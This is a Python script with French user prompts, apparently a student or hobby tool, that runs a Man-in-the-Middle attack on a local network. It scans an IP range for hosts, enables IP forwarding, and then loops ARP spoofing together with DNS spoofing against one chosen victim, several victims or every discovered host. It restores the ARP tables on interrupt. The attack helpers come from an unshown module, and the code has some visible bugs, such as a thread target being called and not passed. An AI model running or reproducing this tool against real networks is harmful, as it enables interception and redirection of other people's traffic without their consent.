#!/usr/bin/python3

from function import *
from scapy.all import *
import threading
import time 
import sys

print("===Bienvenue dans ce programme d'attaque Man In The Middle===\nvous avez plusieurs choix :\n1:Vous souhaiter scannée le reseau afin de trouver des adresses ip disponible. \n2:Vous connaissez deja l'adresse ip de la cible. ")
user_choice= input("Saisissez votre choix: ")


if user_choice == "1" :

# on scan le réseau la reseau d'adresse ip disponible
	plage_ip=input("\nSaisissez la plage d'adresse ip a scanné: ")

	print("-------------------")
	print("vous avez choisi de scaner cette plage ip : {}".format(plage_ip))

	list_IP=scan_ip(plage_ip)

	for ip in list_IP :
		print("voici les adresses ip disponible : {}" .format(ip))
		print("--------------")

	print("\nNous allons recuperer les adresses mac qui correspondent aux ip trouver")
	print("------------------")
	scan_mac=scan_Mac(list_IP)
	



print("===Nous allons recuperer les informations du routeur===")
routerIP = input("Veuillez saisir l'adresse ip du routeur: ")
routerIP_list=[]
routerIP_list.append(routerIP)
MacRouter = scan_Mac(routerIP_list)


routerMac=recup_mac_adress(MacRouter)

 

print("nous allons passer au spoofing ARP ")
user_choice1=input("1: Vous voulez spoofer 1 seul IP.\n2: Vous voulais spoofer plusieurs IP.\n3: vous souhaiter spoofer toute les adresses IP trouver.\nSaisissez votre choix: ")

os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")

if user_choice1 == "1":
	try :

		target_ip=input("\nSaisissez l'adresse ip de la victime ")
		print("--------------")
		print("nous allons recuperer l'adresse mac de : {}".format(target_ip))
		target_list=[]
		target_list.append(target_ip)
		scan_mac = scan_Mac(target_list)
	
		targetMac=recup_mac_adress(scan_mac) 
	 
		sent_packet=0
		while True :
			
			th1 = threading.Thread(target=atck_mitm(target_ip,routerIP, routerMac, targetMac))
			th2 = threading.Thread(target=dns_spoof)
			th1.start()
			th2.start()
			sys.stdout.write("[*] paquets envoyé[%d]\r" %(sent_packet))
			sys.stdout.flush()
			sent_packet+=1
			

	except KeyboardInterrupt:

		th1.join()
		th2.join()
		print("\nwe going to stop the man in the middle attack  ")
		stop = reARP(target_ip,routerIP, routerMac, targetMac)




elif user_choice1 == "2":

	try : 
		list_ip=list_ip()
		scan_mac=scan_Mac(list_ip)

		targetMac=recup_mac_adress(scan_mac)
		sent_packet=0

		
		while True :

			for ip, mac in scan_mac.items():
				
				atck_mitm(ip,routerIP, routerMac, mac)
				sys.stdout.write("[*] paquets envoyé[%d] \r" %(sent_packet))
				sys.stdout.flush()
				sent_packet+=1


		
	except KeyboardInterrupt:

		for ip, mac in scan_mac.items():
			print("\nwe going to stop the man in the middle attack  ")
			reARP(ip,routerIP, routerMac, mac)


elif user_choice1 == "3" :

	try:
		sent_packet=0
		while True: 
			for ip, mac in scan_mac.items(): 
				print("ip = {}, mac = {}".format(ip,mac))
				atck_mitm(ip,routerIP, routerMac, mac)
				print("[*] paquets envoyé[%d%]\r" %(sent_packet))
				sent_packet+=1

		
	except KeyboardInterrupt:

		for ip, mac in scan_mac.items(): 	
			print("\nwe going to stop the man in the middle attack  ")
			reARP(ip,routerIP, routerMac, mac)


